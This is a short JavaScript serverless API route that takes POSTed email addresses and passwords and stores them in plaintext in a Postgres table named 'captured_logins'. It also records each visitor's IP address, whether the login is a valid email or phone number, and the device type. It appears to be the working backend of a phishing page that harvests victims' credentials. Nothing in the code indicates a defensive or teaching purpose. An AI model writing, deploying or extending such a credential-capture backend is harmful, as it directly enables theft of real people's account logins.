const { Pool } = require('pg');

console.log('🔧 API Route loaded');

// Use the correct environment variable from your Vercel settings
// You have DATABASE_URL available in your environment variables
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

export default async function handler(req, res) {
  console.log('📨 Received request method:', req.method);
  
  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    console.log('❌ Method not allowed:', req.method);
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { email, password, userAgent } = req.body;
    console.log('📧 Processing email:', email ? email.substring(0, 3) + '***' : 'none');

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password required' });
    }

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
    
    console.log('🔗 Connecting to database...');
    const client = await pool.connect();
    console.log('✅ Database connected');

    // Validate format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, '');
    const isValidFormat = emailRegex.test(email) || phoneRegex.test(cleanEmail);
    
    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent || '');
    const deviceType = isMobile ? 'mobile' : 'desktop';

    console.log('💾 Inserting into database...');
    const result = await client.query(
      `INSERT INTO captured_logins 
       (email, password, user_agent, ip_address, is_valid_format, device_type) 
       VALUES ($1, $2, $3, $4, $5, $6) 
       RETURNING id`,
      [email, password, userAgent, ip, isValidFormat, deviceType]
    );
    
    await client.release();
    
    console.log('✅ Data inserted. ID:', result.rows[0].id);
    
    res.status(200).json({ 
      success: true, 
      message: 'Credentials logged successfully',
      insertedId: result.rows[0].id 
    });
    
  } catch (error) {
    console.error('❌ Database error:', error);
    
    // More detailed error information
    res.status(500).json({ 
      error: 'Database operation failed',
      details: error.message,
      code: error.code,
      hint: 'Check if table exists and connection string is correct'
    });
  }
}
